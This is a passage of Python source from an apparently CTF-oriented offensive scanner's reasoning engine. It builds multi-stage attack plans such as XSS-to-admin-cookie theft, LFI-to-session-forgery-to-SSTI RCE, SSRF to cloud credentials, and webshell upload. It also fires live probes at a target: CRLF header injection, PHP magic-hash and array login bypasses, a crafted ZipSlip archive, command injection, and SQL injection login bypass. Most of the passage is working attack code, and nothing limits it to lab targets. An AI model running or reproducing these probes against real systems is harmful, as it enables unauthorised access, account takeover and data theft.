                dangerous.append("lfi")

            for d in dangerous:
                # Find matching param in discovered params
                matched_param = next((p for p in sink_params if p in params), None)
                correlations.append({
                    "source_file": fname,
                    "vuln_class": d,
                    "sink_param": matched_param or (list(sink_params)[0] if sink_params else "unknown"),
                    "confidence": 0.9 if matched_param else 0.7,
                    "evidence": f"Leaked {fname} contains {d} sink; param '{matched_param or '?'}' discovered"
                })

        # 2. Tech stack + known vuln association
        if "flask" in tech or "werkzeug" in tech:
            if any("ssti" in c["vuln_class"] for c in correlations):
                pass  # already covered
            elif params:
                correlations.append({
                    "source_file": "tech_stack",
                    "vuln_class": "ssti",
                    "sink_param": params[0],
                    "confidence": 0.5,
                    "evidence": f"Flask/Werkzeug detected with {len(params)} params - SSTI is common"
                })

        return correlations

    # ═══════════════════════════════════════════════════════════════════
    # 3. MULTI-STEP REASONING (Attack Plan)
    # ═══════════════════════════════════════════════════════════════════
    def plan_attack(self) -> List[Dict[str, Any]]:
        """
        Decompose the goal (capture flag) into a multi-step attack plan
        based on hypotheses and correlations. Returns ordered steps with
        REAL dependency chains so complex multi-stage challenges are
        decomposed into prerequisite -> exploit -> escalate -> capture.
        """
        plan = []
        hypotheses = self.build_hypotheses()
        correlations = self.correlate_evidence()

        # Step 0: Always start with recon confirmation
        plan.append({
            "step": 1,
            "goal": "Confirm attack surface",
            "action": "Verify discovered endpoints, params, and tech stack",
            "depends_on": [],
            "hypothesis": None
        })

        step_num = 2

        # ── Multi-stage dependency chains (complex challenges) ──────────
        # Build real prerequisite chains (e.g. XSS->Admin->Flag, LFI->Secret->Session->Admin->SSTI)
        # so that later steps depend on earlier steps actually succeeding.
        chains = self._build_multi_stage_chains(hypotheses, correlations)
        for chain in chains:
            chain_steps = chain["steps"]
            # Assign real step numbers first
            for cs in chain_steps:
                cs["step"] = step_num
                cs["chain"] = chain["chain_name"]
                step_num += 1
            # First chain step depends on recon (step 1)
            chain_steps[0]["depends_on"] = [1]
            # Each subsequent step depends on the previous chain step
            for i in range(1, len(chain_steps)):
                chain_steps[i]["depends_on"] = [chain_steps[i - 1]["step"]]
            plan.extend(chain_steps)

        # ── Correlation-driven steps (highest confidence) ───────────────
        for corr in correlations:
            if corr["confidence"] >= 0.8:
                plan.append({
                    "step": step_num,
                    "goal": f"Exploit {corr['vuln_class']} via {corr['sink_param']}",
                    "action": f"Target param '{corr['sink_param']}' for {corr['vuln_class']} (from {corr['source_file']})",
                    "depends_on": [1],
                    "hypothesis": corr["vuln_class"]
                })
                step_num += 1

        # ── Hypothesis-driven steps ─────────────────────────────────────
        for h in hypotheses:
            if h.confidence >= 0.7:
                plan.append({
                    "step": step_num,
                    "goal": h.title,
                    "action": h.action,
                    "depends_on": [1],
                    "hypothesis": h.vuln_class,
                    "payload": h.payload,
                    "target_param": h.target_param
                })
                step_num += 1

        # Final step: flag extraction (depends on all exploit steps)
        plan.append({
            "step": step_num,
            "goal": "Capture flag",
            "action": "Extract flag from exploited endpoint or RCE output",
            "depends_on": list(range(2, step_num)),
            "hypothesis": None
        })

        self.attack_plan = plan
        return plan

    def _build_multi_stage_chains(self, hypotheses: List["Hypothesis"],
                                  correlations: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Build real multi-stage exploit chains for complex challenges.
        Each chain is a sequence of steps where each step depends on the
        previous one succeeding (prerequisite -> exploit -> escalate -> capture).
        """
        chains = []
        h_by_class = {h.vuln_class: h for h in hypotheses}
        corr_classes = {c["vuln_class"] for c in correlations}
        params = list(self.state.get("parameters", []))
        leaked = self.state.get("leaked_source_files", {})
        leaked_src = " ".join(leaked.values())
        has_report = any(any(k in ep.lower() for k in ["report", "contact", "admin", "bot", "visit"])
                         for ep in self.state.get("endpoints", []))
        has_login = any(any("pass" in i.get("name", "").lower() for i in f.get("inputs", []))
                        for f in self.state.get("forms", []))

        # ── Chain 1: XSS -> Admin -> Flag (stored XSS + admin bot) ──────
        if "xss_to_admin" in h_by_class or "xss_to_admin" in corr_classes:
            if has_report:
                chains.append({
                    "chain_name": "XSS -> Admin Bot -> Flag",
                    "steps": [
                        {"goal": "Inject stored XSS payload", "action": "Submit XSS payload into message/comment form",
                         "hypothesis": "xss_to_admin"},
                        {"goal": "Trigger admin bot visit", "action": "Submit report URL to admin bot endpoint",
                         "hypothesis": "xss_to_admin"},
                        {"goal": "Steal admin session / execute admin action", "action": "Exfiltrate admin cookie or trigger admin-only action",
                         "hypothesis": "xss_to_admin"},
                        {"goal": "Capture flag from admin context", "action": "Read flag from admin-only page",
                         "hypothesis": "xss_to_admin"}
                    ]
                })

        # ── Chain 2: LFI -> Secret Leak -> Session Forgery -> Admin -> SSTI ──
        lfi_param = next((p for p in params if any(k in p.lower() for k in ["file", "page", "include", "view", "path", "doc", "template"])), None)
        if ("lfi" in h_by_class or "lfi" in corr_classes or lfi_param):
            if re.search(r"SECRET_KEY|JWT_SECRET|APP_SECRET", leaked_src, re.IGNORECASE):
                chains.append({
                    "chain_name": "LFI -> Secret Leak -> Session Forgery -> Admin -> SSTI",
                    "steps": [
                        {"goal": "Leak source via LFI", "action": f"Read config/source file via LFI param '{lfi_param or 'file'}'",
                         "hypothesis": "lfi"},
                        {"goal": "Extract SECRET_KEY", "action": "Parse leaked source for signing secret",
                         "hypothesis": "lfi"},
                        {"goal": "Forge admin session token", "action": "Sign forged admin cookie with leaked secret",
                         "hypothesis": "cookie_manipulation"},
                        {"goal": "Access admin panel", "action": "Use forged token to reach admin endpoint",
                         "hypothesis": "cookie_manipulation"},
                        {"goal": "SSTI in admin template", "action": "Inject template payload into admin param for RCE",
                         "hypothesis": "ssti"}
                    ]
                })

        # ── Chain 3: SQLi -> Auth Bypass -> Admin -> Flag ───────────────
        if ("sqli" in h_by_class or "sqli" in corr_classes) and has_login:
            chains.append({
                "chain_name": "SQLi -> Auth Bypass -> Admin -> Flag",
                "steps": [
                    {"goal": "Bypass login via SQLi", "action": "Inject SQL auth bypass into login form",
                     "hypothesis": "sqli"},
                    {"goal": "Access admin session", "action": "Authenticate as admin via SQLi",
                     "hypothesis": "sqli"},
                    {"goal": "Capture flag from admin area", "action": "Read flag from authenticated admin page",
                     "hypothesis": "sqli"}
                ]
            })

        # ── Chain 4: SSRF -> Cloud Metadata -> Credentials -> Admin ─────
        if "ssrf" in h_by_class or "ssrf" in corr_classes:
            chains.append({
                "chain_name": "SSRF -> Cloud Metadata -> Credentials -> Admin",
                "steps": [
                    {"goal": "Trigger SSRF to internal", "action": "Fetch internal/cloud metadata via SSRF param",
                     "hypothesis": "ssrf"},
                    {"goal": "Extract cloud credentials", "action": "Parse IMDS/metadata response for keys",
                     "hypothesis": "ssrf"},
                    {"goal": "Use credentials for admin access", "action": "Authenticate to admin/API with leaked creds",
                     "hypothesis": "ssrf"}
                ]
            })

        # ── Chain 5: Deserialization -> RCE -> Flag ─────────────────────
        if "deserialization" in h_by_class or "deserialization" in corr_classes:
            chains.append({
                "chain_name": "Deserialization -> RCE -> Flag",
                "steps": [
                    {"goal": "Inject deserialization payload", "action": "Send serialized payload to sink param",
                     "hypothesis": "deserialization"},
                    {"goal": "Achieve RCE", "action": "Trigger code execution via gadget chain",
                     "hypothesis": "deserialization"},
                    {"goal": "Capture flag via RCE", "action": "Read flag file from shell output",
                     "hypothesis": "deserialization"}
                ]
            })

        # ── Chain 6: File Upload -> Webshell -> RCE -> Flag ─────────────
        if "file_upload" in h_by_class or "file_upload" in corr_classes:
            chains.append({
                "chain_name": "File Upload -> Webshell -> RCE -> Flag",
                "steps": [
                    {"goal": "Upload malicious file", "action": "Upload webshell/backdoor via upload form",
                     "hypothesis": "file_upload"},
                    {"goal": "Access uploaded file", "action": "Locate and request uploaded webshell",
                     "hypothesis": "file_upload"},
                    {"goal": "Execute commands via webshell", "action": "Run RCE through webshell parameter",
                     "hypothesis": "file_upload"},
                    {"goal": "Capture flag", "action": "Read flag file via webshell RCE",
                     "hypothesis": "file_upload"}
                ]
            })

        return chains

    # ═══════════════════════════════════════════════════════════════════
    # 4. APPLICATION LOGIC AUDIT (Active probing)
    # ═══════════════════════════════════════════════════════════════════
    def audit_application_logic(self) -> List[Dict[str, Any]]:
        """
        Actively probe for application logic flaws that static payloads miss.
        Returns list of confirmed logic vulnerabilities.
        """
        findings = []
        params = list(self.state.get("parameters", []))
        forms = self.state.get("forms", [])

        # 4.1 CRLF / Header Injection (active)
        crlf_findings = self._active_crlf_probe(params)
        findings.extend(crlf_findings)

        # 4.1b Circuit / Logic Puzzle Challenge (active brute-force)
        circuit_findings = self._active_circuit_probe()
        findings.extend(circuit_findings)

        # 4.1c ZipSlip / Archive upload (active probe)
        zipslip_findings = self._active_zipslip_probe()
        findings.extend(zipslip_findings)

        # 4.1d Command Injection via URL/Media (active probe)
        cmdinj_findings = self._active_cmd_injection_probe()
        findings.extend(cmdinj_findings)

        # 4.1e SQLi via unsanitized params (active probe)
        sqli_findings = self._active_sqli_probe()
        findings.extend(sqli_findings)

        # 4.2 Type juggling on login forms
        for form in forms:
            action = form.get("action", self.target_url)
            method = form.get("method", "POST")
            inputs = [i.get("name", "") for i in form.get("inputs", []) if i.get("type") not in ["submit", "button"]]
            if any("pass" in n.lower() for n in inputs):
                # Magic hash bypass
                magic_hashes = [
                    "0e462097431906509019562988736854",  # md5 magic
                    "0e830400451993494058024219903391",  # sha1 magic
                    "240610708",                          # classic md5 magic
                ]
                for mh in magic_hashes:
                    data = {}
                    for n in inputs:
                        if "pass" in n.lower():
                            data[n] = mh
                        elif "user" in n.lower() or "login" in n.lower():
                            data[n] = "admin"
                        else:
                            data[n] = ""
                    try:
                        if method == "POST":
                            r = self.session.post(action, data=data, timeout=4)
                        else:
                            r = self.session.get(action, params=data, timeout=4)
                        if r.status_code in [302, 301] or any(k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout"]):
                            findings.append({
                                "vuln_class": "type_juggling",
                                "title": "PHP Magic Hash Type Juggling Bypass",
                                "param": "password",
                                "payload": mh,
                                "evidence": f"Login bypassed with magic hash '{mh}' on {action}"
                            })
                            break
                    except Exception:
                        pass

        # 4.3 Array injection (type juggling via arrays)
        for form in forms:
            action = form.get("action", self.target_url)
            method = form.get("method", "POST")
            inputs = [i.get("name", "") for i in form.get("inputs", []) if i.get("type") not in ["submit", "button"]]
            for n in inputs:
                if "pass" in n.lower():
                    data = {n: ["x"], **{i: "admin" for i in inputs if i != n}}
                    try:
                        if method == "POST":
                            r = self.session.post(action, data=data, timeout=4)
                        else:
                            r = self.session.get(action, params=data, timeout=4)
                        if r.status_code in [302, 301] or any(k in r.text.lower() for k in ["welcome", "dashboard", "admin", "logout"]):
                            findings.append({
                                "vuln_class": "type_juggling",
                                "title": "Array Injection Type Juggling Bypass",
                                "param": n,
                                "payload": f"{n}[]=x",
                                "evidence": f"Login bypassed with array injection on {action}"
                            })
                            break
                    except Exception:
                        pass

        return findings

    def _active_crlf_probe(self, params: List[str]) -> List[Dict[str, Any]]:
        """Actively probe CRLF injection on header-reflecting parameters."""
        findings = []
        candidates = [p for p in params if p.lower() in self.HEADER_REFLECT_PARAMS]
        if not candidates:
            candidates = params[:3]

        for param in candidates:
            canary = "ctf_crlf_%d" % int(time.time() % 100000)
            # Try multiple CRLF encodings
            probes = [
                f"fr%0d%0aX-Ctf-Canary: {canary}",
                f"fr%0d%0aSet-Cookie: ctf_canary={canary}",
                f"fr%0a%0aX-Ctf-Canary: {canary}",
                f"fr%0d%0a%0d%0a{canary}",
            ]
            for probe in probes:
                try:
                    sep = "&" if "?" in self.base_url else "?"
                    probe_url = f"{self.base_url}{sep}{param}={probe}"
                    r = self.session.get(probe_url, allow_redirects=False, timeout=4)
                    resp_headers = {k.lower(): v for k, v in r.headers.items()}
                    injected = any(canary in v for v in resp_headers.values()) or "x-ctf-canary" in resp_headers
                    if injected:
                        findings.append({
                            "vuln_class": "crlf_injection",
                            "title": "CRLF / HTTP Response Splitting",
                            "param": param,
                            "payload": probe,
                            "evidence": f"Injected header observed in response for param '{param}'",
                            "exploit": f"Set-Cookie injection to escalate: {param}=fr%0d%0aSet-Cookie:%20admin=1%3b%20Path%3d/"
                        })
                        return findings
                except Exception:
                    pass
        return findings

    def _active_circuit_probe(self) -> List[Dict[str, Any]]:
        """
        Actively probe circuit/logic-puzzle challenges by fuzzing node IDs
        in the circuit JSON submitted to the checker endpoint. The goal is
        to find a circuit combination that the server accepts and reveals
        the flag. This handles challenges where the server-side validator
        is weak or where the correct circuit can be brute-forced.
        """
        findings = []
        html = self.state.get("baseline_html", "")
        endpoints = list(self.state.get("endpoints", []))
        inline_scripts = self.state.get("inline_scripts", [])

        all_source = html + " " + " ".join(inline_scripts)
        all_source_lower = all_source.lower()

        # Only proceed if this looks like a circuit challenge
        is_circuit = any(re.search(pat, all_source_lower) for pat in self.CIRCUIT_CHALLENGE_HINTS)
        if not is_circuit:
            return findings

        # Find the checker endpoint
        check_endpoint = None
        for ep in endpoints:
            if any(ep.lower().endswith(c) for c in self.CIRCUIT_CHECK_ENDPOINTS):
                check_endpoint = ep
                break
        if not check_endpoint:
            m = re.search(r"fetch\(\s*['\"]([^'\"]*check[^'\"]*)['\"]", all_source)
            if m:
                check_endpoint = m.group(1)
        if not check_endpoint:
            # Default to /check
            check_endpoint = "/check"

        # Resolve relative endpoint against base URL
        if check_endpoint.startswith("/"):
            parsed = urlparse(self.base_url)
            check_url = f"{parsed.scheme}://{parsed.netloc}{check_endpoint}"
        else:
            check_url = urljoin(self.base_url, check_endpoint)

        # Detect input node IDs and output count from source
        output_count = 4
        m = re.search(r"for\s*\(\s*let\s+i\s*=\s*0\s*;\s*i\s*<\s*(\d+)\s*;\s*i\+\+\s*\)\s*\{\s*createNode", all_source)
        if m:
            output_count = int(m.group(1))

        input_start = 5
        m = re.search(r"nextNodeId\s*=\s*(\d+)", all_source)
        if m:
            input_start = int(m.group(1))

        # Strategy 1: Try NOT gates (NAND(x,x) = NOT(x)) for each output
        # This is the most common solution for "flip the outputs" challenges
        print_info(f"Circuit challenge detected. Probing checker at {check_url} with NOT-gate circuits...")
        for mapping in self._generate_not_gate_mappings(input_start, output_count):
            circuit = [
                {"input1": inp, "input2": inp, "output": out}
                for inp, out in mapping
            ]
            try:
                r = self.session.post(check_url, json={"circuit": circuit}, timeout=5)
                resp = r.text
                # Check for flag in response
                flag = find_flags(resp)
                if flag:
                    findings.append({
                        "vuln_class": "circuit_bruteforce",
                        "title": "Circuit Logic Challenge Solved - NOT Gate Mapping",
                        "param": "circuit",
                        "payload": str(circuit),
                        "evidence": f"NOT-gate circuit {mapping} revealed flag: {flag[0]}",
                        "exploit": f"POST {check_url} with circuit {circuit}",
                        "flag": flag[0]
                    })
                    return findings
                # Check for success indicator (not "wrong answer")
                if "wrong" not in resp.lower() and "incorrect" not in resp.lower() and "fail" not in resp.lower():
                    if '"flag"' in resp.lower() or 'success' in resp.lower():
                        findings.append({
                            "vuln_class": "circuit_bruteforce",
                            "title": "Circuit Logic Challenge - Successful Circuit Found",
                            "param": "circuit",
                            "payload": str(circuit),
                            "evidence": f"Circuit {mapping} accepted by server: {resp[:200]}",
                            "exploit": f"POST {check_url} with circuit {circuit}"
                        })
                        return findings
            except Exception:
                pass

        # Strategy 2: Brute-force node ID combinations
        # Try all pairs of input nodes for each output
        print_info("NOT-gate mapping failed. Brute-forcing node ID combinations...")
        input_nodes = list(range(input_start, input_start + output_count))
        output_nodes = list(range(1, output_count + 1))

        # Try each output connected to each input (single NAND gate per output)
        for out in output_nodes:
            for inp in input_nodes:
                circuit = [{"input1": inp, "input2": inp, "output": out}]
                try:
                    r = self.session.post(check_url, json={"circuit": circuit}, timeout=5)
                    resp = r.text
                    flag = find_flags(resp)
                    if flag:
                        findings.append({
                            "vuln_class": "circuit_bruteforce",
                            "title": "Circuit Logic Challenge Solved - Single Gate",
                            "param": "circuit",
                            "payload": str(circuit),
                            "evidence": f"Single-gate circuit output={out} input={inp} revealed flag: {flag[0]}",
                            "exploit": f"POST {check_url} with circuit {circuit}",
                            "flag": flag[0]
                        })
                        return findings
                except Exception:
                    pass

        # Strategy 3: Try all pairs of inputs for each output (2-input NAND)
        print_info("Single-gate brute-force failed. Trying 2-input NAND combinations...")
        for out in output_nodes:
            for i in range(len(input_nodes)):
                for j in range(i, len(input_nodes)):
                    circuit = [{"input1": input_nodes[i], "input2": input_nodes[j], "output": out}]
                    try:
                        r = self.session.post(check_url, json={"circuit": circuit}, timeout=5)
                        resp = r.text
                        flag = find_flags(resp)
                        if flag:
                            findings.append({
                                "vuln_class": "circuit_bruteforce",
                                "title": "Circuit Logic Challenge Solved - 2-Input NAND",
                                "param": "circuit",
                                "payload": str(circuit),
                                "evidence": f"2-input NAND circuit output={out} inputs=({input_nodes[i]},{input_nodes[j]}) revealed flag: {flag[0]}",
                                "exploit": f"POST {check_url} with circuit {circuit}",
                                "flag": flag[0]
                            })
                            return findings
                    except Exception:
                        pass

        return findings

    def _generate_not_gate_mappings(self, input_start: int, output_count: int) -> List[List[Tuple[int, int]]]:
        """
        Generate all possible NOT-gate mappings from inputs to outputs.
        Each mapping assigns each output to a distinct input (or same input
        for all outputs if fewer inputs than outputs).
        Returns list of (input_node, output_node) pairs.
        """
        input_nodes = list(range(input_start, input_start + output_count))
        output_nodes = list(range(1, output_count + 1))

        mappings = []
        # Try direct 1:1 mapping (output i = NOT(input i))
        mappings.append(list(zip(input_nodes, output_nodes)))

        # Try shifted mappings
        for shift in range(1, output_count):
            shifted = [(input_nodes[(i + shift) % output_count], output_nodes[i]) for i in range(output_count)]
            mappings.append(shifted)

        # Try reversed mapping
        mappings.append(list(zip(reversed(input_nodes), output_nodes)))

        # Try all outputs connected to the same input
        for inp in input_nodes:
            mappings.append([(inp, out) for out in output_nodes])

        return mappings

    def _active_zipslip_probe(self) -> List[Dict[str, Any]]:
        """
        Actively probe for ZipSlip / archive traversal by crafting a malicious
        tar.gz archive with path traversal filenames and uploading it.
        """
        findings = []
        forms = self.state.get("forms", [])
        upload_forms = [
            f for f in forms
            if f.get("enctype") == "multipart/form-data" or
            any(i.get("type") == "file" for i in f.get("inputs", []))
        ]
        if not upload_forms:
            return findings

        for form in upload_forms:
            action = form.get("action", self.target_url)
            file_inputs = [i.get("name", "") for i in form.get("inputs", []) if i.get("type") == "file"]
            if not file_inputs:
                continue
            file_param = file_inputs[0]

            # Craft a malicious tar.gz with path traversal filename
            try:
                import io
                import tarfile
                buf = io.BytesIO()
                with tarfile.open(fileobj=buf, mode="w:gz") as tar:
                    # Path traversal filename: ../../../../tmp/pwned.txt
                    info = tarfile.TarInfo("../../../../tmp/pwned.txt")
                    info.size = len(b"pwned")
                    tar.addfile(info, io.BytesIO(b"pwned"))
                payload_bytes = buf.getvalue()

                files = {file_param: ("evil.tar.gz", payload_bytes, "application/gzip")}
                r = self.session.post(action, files=files, timeout=5)
                if r.status_code in [200, 201, 302]:
                    findings.append({
                        "vuln_class": "zipslip",
                        "title": "ZipSlip - Archive Path Traversal",
                        "param": file_param,
                        "payload": "../../../../tmp/pwned.txt",
                        "evidence": f"Archive upload accepted on {action} (status {r.status_code})"
                    })
            except Exception:
                pass

        return findings

    def _active_cmd_injection_probe(self) -> List[Dict[str, Any]]:
        """
        Actively probe for command injection via URL/media URI fields.
        Uses a benign command (sleep 0) to detect execution without harm.
        """
        findings = []
        forms = self.state.get("forms", [])
        url_fields = [
            i.get("name", "") for f in forms
            for i in f.get("inputs", [])
            if i.get("name") in ["media_uri", "url", "uri", "media", "link", "image_url"]
        ]
        if not url_fields:
            return findings

        for form in forms:
            action = form.get("action", self.target_url)
            method = form.get("method", "POST")
            inputs = [i.get("name", "") for i in form.get("inputs", []) if i.get("type") not in ["submit", "button"]]
            for field in url_fields:
                if field not in inputs:
                    continue
                # Benign probe: inject a harmless command that echoes a marker
                payload = "http://google.com/aaa?x=;echo${IFS}CMDIJN_MARKER;"
                data = {**{i: "" for i in inputs}, field: payload}
                try:
                    if method == "POST":
                        r = self.session.post(action, data=data, timeout=5)
                    else:
                        r = self.session.get(action, params=data, timeout=5)
                    if "CMDIJN_MARKER" in r.text:
                        findings.append({
                            "vuln_class": "cmd_injection_url",
                            "title": "Command Injection via URL/Media Parsing",
                            "param": field,
                            "payload": payload,
                            "evidence": f"Command output reflected in response on {action}"
                        })
                except Exception:
                    pass

        return findings

    def _active_sqli_probe(self) -> List[Dict[str, Any]]:
        """
        Actively probe for SQL injection via unsanitized params using
        boolean-based blind detection (comparing response to quote injection).
        """
        findings = []
        forms = self.state.get("forms", [])
        auth_forms = [
            f for f in forms
            if any(i.get("name") in ["username", "password", "code", "reset_code"] for i in f.get("inputs", []))
        ]
        if not auth_forms:
            return findings

        for form in auth_forms:
            action = form.get("action", self.target_url)
            method = form.get("method", "POST")
            inputs = [i.get("name", "") for i in form.get("inputs", []) if i.get("type") not in ["submit", "button"]]
            username_field = next((i for i in inputs if i in ["username", "email", "user"]), None)
            if not username_field:
                continue

            # Baseline: normal input
            baseline_data = {**{i: "test" for i in inputs}}
            try:
                if method == "POST":
                    r_base = self.session.post(action, data=baseline_data, timeout=5)
                else:
                    r_base = self.session.get(action, params=baseline_data, timeout=5)
                base_len = len(r_base.text)
            except Exception:
                continue

            # Probe: SQL injection that should always be true
            sqli_data = {**{i: "test" for i in inputs}, username_field: "' or '1'='1' -- "}
            try:
                if method == "POST":
                    r_sqli = self.session.post(action, data=sqli_data, timeout=5)
                else:
                    r_sqli = self.session.get(action, params=sqli_data, timeout=5)
                if len(r_sqli.text) != base_len or r_sqli.status_code != r_base.status_code:
                    findings.append({
                        "vuln_class": "sqli_unsanitized",
                        "title": "SQL Injection via Unsanitized Parameter",
                        "param": username_field,
                        "payload": "' or '1'='1' -- ",
                        "evidence": f"Response differs from baseline on {action} (SQLi likely)"
                    })
            except Exception:
                pass

        return findings

    def record_probe(self, param: str, payload: str, success: bool, note: str = ""):
        """Record a probe result to adapt future strategy."""
        self.probe_history.append({
            "param": param,
            "payload": payload,
            "success": success,
            "note": note,
            "time": time.strftime("%H:%M:%S")
        })

    def get_adaptive_recommendation(self) -> Optional[str]:
        """
        Based on probe history, recommend a pivot strategy.
        E.g. if all GET probes failed, suggest POST; if direct payloads blocked, suggest encoding.
        """
        if not self.probe_history:
            return None

        failures = [p for p in self.probe_history if not p["success"]]
        if len(failures) >= 3:
            # Check if WAF likely blocking
            waf_hints = any("waf" in p["note"].lower() or "block" in p["note"].lower() for p in failures)
            if waf_hints:
                return "Multiple probes blocked - likely WAF/filter active. Pivot to encoding bypasses (hex, double-URL, comment splitting)."
            return "Multiple probes failed. Consider: (1) different HTTP method, (2) different parameter, (3) encoding obfuscation, (4) chaining with another vuln."

        return None

    # ═══════════════════════════════════════════════════════════════════
    # EXECUTION & REPORTING
    # ═══════════════════════════════════════════════════════════════════
    def run_full_reasoning(self) -> Dict[str, Any]:
        """
        Execute the complete reasoning cycle:
        build hypotheses -> correlate evidence -> plan attack -> audit logic.
        Returns a structured reasoning report.
        """
        print_header("محرك التفكير العميق", "Deep Reasoning Engine - Hypothesis & Strategy")

        # 1. Build hypotheses
        hypotheses = self.build_hypotheses()
        if hypotheses:
            rows = [[h.vuln_class, h.title, f"{h.confidence*100:.0f}%", "; ".join(h.evidence[:2])] for h in hypotheses]
            print_table(["Vuln Class", "Hypothesis", "Confidence", "Key Evidence"], rows, title="Generated Offensive Hypotheses")
        else:
            print_info("No high-confidence hypotheses generated from current evidence.")

        # 2. Correlate evidence
        correlations = self.correlate_evidence()
        if correlations:
            rows = [[c["vuln_class"], c["source_file"], c["sink_param"], f"{c['confidence']*100:.0f}%"] for c in correlations]
            print_table(["Vuln Class", "Source", "Sink Param", "Confidence"], rows, title="Correlated Evidence")

        # 3. Plan attack
        plan = self.plan_attack()
        if plan:
            rows = [[str(s["step"]), s["goal"], s["action"], ", ".join(str(d) for d in s["depends_on"])] for s in plan]
            print_table(["Step", "Goal", "Action", "Depends On"], rows, title="Multi-Step Attack Plan")

        # 4. Audit application logic (active)
        print_info("Auditing application logic for complex flaws (CRLF, type juggling, arrays)...")
        logic_findings = self.audit_application_logic()
        if logic_findings:
            for f in logic_findings:
                print_success(f"Logic Flaw Confirmed: [bold yellow]{f['title']}[/bold yellow]")
                print_info(f"  Evidence: {f['evidence']}")
                if f.get("exploit"):
                    print_info(f"  Exploit: {f['exploit']}")
        else:
            print_info("No application logic flaws confirmed via active probing.")

        # 5. Adaptive recommendation
        rec = self.get_adaptive_recommendation()
        if rec:
            print_warning(f"Adaptive Strategy: {rec}")

        return {
            "hypotheses": [h.to_dict() for h in hypotheses],
            "correlations": correlations,
            "attack_plan": plan,
            "logic_findings": logic_findings,
            "adaptive_recommendation": rec
        }
